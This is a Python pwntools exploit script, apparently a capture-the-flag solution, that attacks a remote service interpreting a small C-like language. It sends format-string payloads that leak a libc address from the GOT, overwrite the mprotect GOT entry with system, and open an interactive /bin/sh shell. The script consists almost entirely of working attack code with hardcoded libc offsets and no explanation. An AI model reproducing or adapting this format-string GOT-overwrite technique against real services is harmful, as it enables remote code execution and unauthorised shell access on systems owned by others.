#!/usr/bin/env python
import sys, os
from pwn import *

def fmtchar(prev_word, word, index, byte = 1):
    fmt = ""
    if word - prev_word > 0 :
        result = word - prev_word 
        fmt += "%" + str(result) + "c"
    elif word == prev_word :
        result = 0
    else :
        result = 256**byte - prev_word + word
        fmt += "%" + str(result) + "c"
    if byte == 2 :
        fmt += "%" + str(index) + "$hn"
    elif byte == 4 :
        fmt += "%" + str(index) + "$n"
    else :
        fmt += "%" + str(index) + "$hhn"
    return fmt

log.warning('Usage: ./exp.py [HOST] [PORT]')
prog = os.path.dirname(os.path.abspath(__file__)).split('/')[-1]
elf = ELF(prog)
if not elf: log.warning('Cannot open ' + prog)
#libc = ELF('libc.so.6') if len(sys.argv) > 2 else elf.libc
#if not libc: log.warning('Cannot open libc.so.6')
HOST, PORT = (sys.argv[1], sys.argv[2]) if len(sys.argv) > 2 else ('localhost', 5566)
context.word_size = 64 if '64' in elf.arch else 32 # amd64, aarch64, powerpc64, mips64

r = remote(HOST, PORT)

tpl = """\
begin(a){
    %s
    fillout("/bin/sh", 0, 0);
}
EOF"""

# %18$p = 0xffffd098 / 0xffffddb8
off = 0xb8 if len(sys.argv) > 2 else 0x98
mprotect = elf.got['__libc_start_main']
fmt =  'puts("%s");' % fmtchar(0, off, 14)
fmt += 'puts("%s");' % fmtchar(0, mprotect & 0xffff, 18, 2)
fmt += 'puts("%s");' % fmtchar(0, off+2, 14)
fmt += 'puts("%s");' % fmtchar(0, mprotect >> 16, 18, 2)
fmt += 'puts("leak:%30$s");'

log.info(fmt)
exp = tpl % fmt
assert len(exp) <= 1024, 'gg'
r.sendline(exp, 1024)
r.recvuntil('leak:')
leak = u32(r.recv(4))
log.info('__libc_start_main: ' + hex(leak))
#libc_base = leak - 0x19970
libc_base = leak - 0x18650 
#system = libc_base + 0x3e3e0 
system = libc_base + 0x3b160 
r.close()

#system = 0xf7e3d160 
#off = 0xb8 if len(sys.argv) > 2 else 0x98
# shell out
r = remote(HOST, PORT)
mprotect = elf.got['mprotect']
fmt =  'puts("%s");' % fmtchar(0, off, 14)
fmt += 'puts("%s");' % fmtchar(0, mprotect & 0xffff, 18, 2)
fmt += 'puts("%s");' % fmtchar(0, off+2, 14)
fmt += 'puts("%s");' % fmtchar(0, mprotect >> 16, 18, 2)
fmt += 'puts("%s");' % fmtchar(0, system & 0xffff, 30, 2)
fmt +=  'puts("%s");' % fmtchar(0, off, 14)
fmt += 'puts("%s");' % fmtchar(0, (mprotect+2) & 0xffff, 18, 2)
fmt += 'puts("%s");' % fmtchar(0, system >> 16, 30, 2)

log.info(fmt)
exp = tpl % fmt
assert len(exp) <= 1024, 'gg'
r.sendline(exp, 1024)

r.interactive()
